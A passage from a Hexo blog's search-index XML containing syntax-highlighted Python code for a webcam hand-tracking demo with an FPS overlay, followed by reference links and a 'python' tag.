cTime <span class="token operator">=</span><span class="token number">0</span>    detector<span class="token operator">=</span> handDetector<span class="token punctuation">(</span><span class="token punctuation">)</span>    cap <span class="token operator">=</span>cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span>img<span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        img <span class="token operator">=</span> detector<span class="token punctuation">.</span>findHands<span class="token punctuation">(</span>img<span class="token punctuation">)</span>        imList <span class="token operator">=</span> detector<span class="token punctuation">.</span>findPos<span class="token punctuation">(</span>img<span class="token punctuation">)</span>        cTime<span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        fps<span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span>cTime<span class="token operator">-</span>pTime<span class="token punctuation">)</span>        pTime<span class="token operator">=</span>cTime        cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>fps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>        cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"Rgylin"</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>        cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接:<br><a href="https://www.computervision.zone/">https://www.computervision.zone</a><a href="https://hexo.io/docs/one-command-deployment.html">https://hexo.io/docs/one-command-deployment.html</a>)</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
